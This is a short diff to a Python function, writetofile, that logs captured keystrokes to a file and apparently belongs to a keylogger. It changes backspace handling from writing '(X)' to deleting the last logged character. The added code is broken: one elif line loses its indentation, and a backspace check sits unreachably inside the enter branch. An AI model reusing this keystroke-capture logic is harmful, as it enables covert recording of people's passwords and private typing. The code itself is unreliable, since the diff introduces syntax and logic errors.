@@ -122,10 +122,15 @@ def writetofile(key):
             k = str(key).replace("'", "")
             if k=="Key.space":
                 f.write(' ')
-            elif k=="Key.enter":
+           elif k=="Key.enter":
                 f.write('\n')
+                if(k=="Key.backspace"):
+                    f.seek(0, 2)              
+                    f.seek(f.tell() - 2, 0) 
+                    f.truncate()
             elif k=="Key.backspace":
-                f.write('(X)')
+                a=f.seek(f.tell() - 1, os.SEEK_SET)
+                f.truncate()
             elif(k in d.keys()):
                 f.write(d[k])
             elif k.find("Key")==-1:
